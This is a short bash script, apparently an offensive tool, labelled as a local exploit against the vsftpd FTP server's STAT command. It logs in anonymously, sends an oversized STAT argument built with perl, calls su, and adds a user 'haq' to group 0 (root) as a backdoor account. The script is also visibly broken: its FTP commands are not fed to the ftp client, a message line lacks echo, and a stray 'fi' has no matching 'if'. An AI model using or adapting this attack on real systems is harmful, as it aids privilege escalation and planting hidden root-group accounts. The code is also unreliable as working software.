#!/bin/bash
## Vsftpd STAT local exploit very rough hack :P (xd)
if [ $# -eq 0 ]; then
echo "Usage: shell $0"
exit 1
fi
echo "\n[+] Sending request for anonymous user login to Local FTPd..\n"
ftp localhost
USER anonymous
PASS anonymous
STAT perl -e 'print"ABC"x128 ."\n";'
"\n[+] Ok... check id now and see if it worked..\n"
su
echo "\nAdding user..\n"
useradd haq -m -g 0
echo "\n[+] Added!\n"
exit 0
fi
